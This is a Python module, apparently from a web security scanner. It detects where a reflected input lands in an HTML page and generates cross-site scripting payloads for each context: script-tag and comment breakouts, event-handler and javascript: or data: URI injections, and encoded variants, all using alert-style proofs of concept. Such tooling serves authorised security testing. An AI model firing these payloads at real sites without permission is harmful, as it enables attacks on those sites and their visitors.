#!/usr/bin/env python3
"""
Context-aware payload generator that analyzes where input is placed in HTML
"""

import re
from typing import Dict, Any, List, Optional
import logging

class ContextDetector:
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        
        # HTML context patterns
        self.context_patterns = {
            'script': [
                r'<script[^>]*>.*?{param}.*?</script>',
                r'on\w+\s*=\s*["\']?.*?{param}.*?["\']?',
                r'javascript:.*?{param}'
            ],
            'attribute': [
                r'<[^>]*?\s+(\w+)\s*=\s*["\']?.*?{param}.*?["\']?[^>]*>',
                r'{param}\s*=\s*["\']?[^"\']*["\']?'
            ],
            'comment': [
                r'<!--.*?{param}.*?-->'
            ],
            'style': [
                r'<style[^>]*>.*?{param}.*?</style>',
                r'style=["\']?.*?{param}.*?["\']?'
            ],
            'tag': [
                r'<{param}[>\s]',
                r'<(\w+)[^>]*>.*?</\1>'
            ]
        }
        
    def analyze_response(self, response_html: str, param_name: str, 
                        test_payload: str) -> Dict[str, Any]:
        """
        Analyze where the parameter appears in the HTML response
        
        Args:
            response_html: The HTML response from the server
            param_name: The parameter name being tested
            test_payload: The payload that was sent
            
        Returns:
            Dictionary with context analysis results
        """
        context = {
            'location': 'unknown',
            'tag_name': None,
            'attribute_name': None,
            'is_encoded': False,
            'encoding_type': None,
            'is_filtered': False,
            'surrounding_html': None,
            'line_number': None,
            'context_safety': 'unknown'
        }
        
        # Find where the payload appears
        if test_payload in response_html:
            # Get surrounding context
            context['surrounding_html'] = self._get_surrounding_context(
                response_html, test_payload
            )
            
            # Determine location type
            context['location'] = self._determine_location(
                response_html, test_payload
            )
            
            # Check for encoding
            context['is_encoded'], context['encoding_type'] = self._check_encoding(
                response_html, test_payload
            )
            
            # Extract tag and attribute if in attribute context
            if context['location'] == 'attribute':
                tag_info = self._extract_tag_and_attribute(
                    response_html, test_payload
                )
                context.update(tag_info)
            
            # Check for filtering
            context['is_filtered'] = self._check_filtering(
                response_html, test_payload
            )
            
            # Determine context safety
            context['context_safety'] = self._assess_context_safety(context)
            
        return context
    
    def _get_surrounding_context(self, html: str, payload: str, 
                                 chars: int = 100) -> str:
        """Get surrounding HTML context around the payload"""
        index = html.find(payload)
        if index == -1:
            return ""
            
        start = max(0, index - chars)
        end = min(len(html), index + len(payload) + chars)
        
        return html[start:end]
    
    def _determine_location(self, html: str, payload: str) -> str:
        """Determine where the payload appears in the HTML"""
        
        # Check script context
        script_pattern = re.compile(
            r'<script[^>]*>.*?' + re.escape(payload) + r'.*?</script>',
            re.IGNORECASE | re.DOTALL
        )
        if script_pattern.search(html):
            return 'script'
        
        # Check attribute context
        attr_pattern = re.compile(
            r'\w+\s*=\s*["\']?[^"\'>]*' + re.escape(payload) + r'[^"\'>]*["\']?',
            re.IGNORECASE
        )
        if attr_pattern.search(html):
            return 'attribute'
        
        # Check comment context
        comment_pattern = re.compile(
            r'<!--.*?' + re.escape(payload) + r'.*?-->',
            re.IGNORECASE | re.DOTALL
        )
        if comment_pattern.search(html):
            return 'comment'
        
        # Check style context
        style_pattern = re.compile(
            r'<style[^>]*>.*?' + re.escape(payload) + r'.*?</style>',
            re.IGNORECASE | re.DOTALL
        )
        if style_pattern.search(html):
            return 'style'
        
        # Check if it's just in the text
        if re.search(r'>[^<]*' + re.escape(payload) + r'[^<]*<', html):
            return 'text'
        
        return 'unknown'
    
    def _check_encoding(self, html: str, payload: str) -> tuple:
        """Check if the payload has been encoded"""
        
        encoding_patterns = {
            'html_entity': [
                '&lt;', '&gt;', '&amp;', '&quot;', '&#x',
                '&#39;', '&apos;'
            ],
            'url_encoding': [
                '%3C', '%3E', '%22', '%27', '%2F', '%3B'
            ],
            'unicode_escape': [
                '\\u003c', '\\u003e', '\\u0022', '\\u0027'
            ],
            'hex_encoding': [
                '\\x3c', '\\x3e', '\\x22', '\\x27'
            ],
            'base64': [
                'PHNjcmlwdA==', 'YWxlcnQ='
            ]
        }
        
        for encoding_type, patterns in encoding_patterns.items():
            for pattern in patterns:
                if pattern in html:
                    return True, encoding_type
        
        return False, None
    
    def _extract_tag_and_attribute(self, html: str, payload: str) -> Dict[str, Any]:
        """Extract tag name and attribute name from context"""
        result = {
            'tag_name': None,
            'attribute_name': None
        }
        
        # Look for tag containing the payload
        tag_pattern = re.compile(
            r'<(\w+)[^>]*\s+(\w+)\s*=\s*["\']?[^"\'>]*' + 
            re.escape(payload) + r'[^"\'>]*["\']?[^>]*>',
            re.IGNORECASE
        )
        
        match = tag_pattern.search(html)
        if match:
            result['tag_name'] = match.group(1)
            result['attribute_name'] = match.group(2)
            
        return result
    
    def _check_filtering(self, html: str, payload: str) -> bool:
        """Check if the payload has been filtered (partial removal)"""
        
        # Common filtering patterns
        filtering_patterns = [
            r'script'.replace('s', '[sS]').replace('c', '[cC]'),
            r'alert'.replace('a', '[aA]').replace('l', '[lL]'),
            r'on\w+'.replace('o', '[oO]').replace('n', '[nN]')
        ]
        
        for pattern in filtering_patterns:
            if re.search(pattern, html, re.IGNORECASE):
                # Check if original payload still appears
                if payload.lower() not in html.lower():
                    return True
                    
        return False
    
    def _assess_context_safety(self, context: Dict[str, Any]) -> str:
        """Assess how safe the context is for XSS exploitation"""
        
        # Most dangerous contexts (least safe)
        if context['location'] == 'script' and not context['is_encoded']:
            return 'high_risk'
        elif context['location'] == 'attribute' and not context['is_encoded']:
            if context.get('attribute_name') in ['href', 'src', 'onload', 'onerror']:
                return 'high_risk'
        
        # Medium risk
        elif context['location'] == 'attribute' and context['is_encoded']:
            return 'medium_risk'
        elif context['location'] == 'text' and not context['is_encoded']:
            return 'medium_risk'
        
        # Lower risk
        elif context['is_encoded']:
            return 'low_risk'
        
        return 'unknown'
    
    def generate_context_payloads(self, context: Dict[str, Any]) -> List[str]:
        """
        Generate payloads specific to the detected context
        
        Args:
            context: Context analysis dictionary
            
        Returns:
            List of context-appropriate payloads
        """
        payloads = []
        
        if context['location'] == 'script':
            payloads.extend([
                f"';alert('XSS')//",
                f"\\';alert('XSS')//",
                f"</script><script>alert('XSS')</script>",
                f"alert('XSS')//",
                f"window['alert']('XSS')"
            ])
            
        elif context['location'] == 'attribute':
            tag = context.get('tag_name', '')
            attr = context.get('attribute_name', '')
            
            if attr in ['href', 'src']:
                payloads.extend([
                    f"javascript:alert('XSS')",
                    f"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
                ])
            elif attr.startswith('on'):
                payloads.extend([
                    f"{attr}=alert('XSS')",
                    f"{attr}=confirm('XSS')",
                    f"{attr}=prompt('XSS')"
                ])
            else:
                payloads.extend([
                    f"\" onmouseover=\"alert('XSS')\"",
                    f"' onfocus=\"alert('XSS')\" autofocus",
                    f"\" onclick=\"alert('XSS')\"",
                    f"\" onerror=\"alert('XSS')\" src=x"
                ])
                
        elif context['location'] == 'comment':
            payloads.extend([
                f"--><script>alert('XSS')</script>",
                f"--!><script>alert('XSS')</script>"
            ])
            
        elif context['location'] == 'style':
            payloads.extend([
                f"</style><script>alert('XSS')</script>",
                f"expression(alert('XSS'))",
                f"url(javascript:alert('XSS'))"
            ])
            
        else:  # General context
            payloads.extend([
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg/onload=alert('XSS')>",
                "<body onload=alert('XSS')>"
            ])
        
        # Add encoding variations if needed
        if context['is_encoded']:
            encoded_payloads = self._generate_encoded_payloads(payloads, context)
            payloads.extend(encoded_payloads)
        
        return list(set(payloads))  # Remove duplicates
    
    def _generate_encoded_payloads(self, payloads: List[str], 
                                   context: Dict[str, Any]) -> List[str]:
        """Generate encoded versions of payloads"""
        encoded = []
        
        encoding_type = context.get('encoding_type', 'html_entity')
        
        for payload in payloads:
            if encoding_type == 'html_entity':
                # Double encode if needed
                encoded.append(payload.replace('<', '&lt;').replace('>', '&gt;'))
                encoded.append(payload.replace('<', '&lt;').replace('>', '&gt;')
                              .replace('&', '&amp;'))
            elif encoding_type == 'url_encoding':
                import urllib.parse
                encoded.append(urllib.parse.quote(payload))
                encoded.append(urllib.parse.quote_plus(payload))
                
        return encoded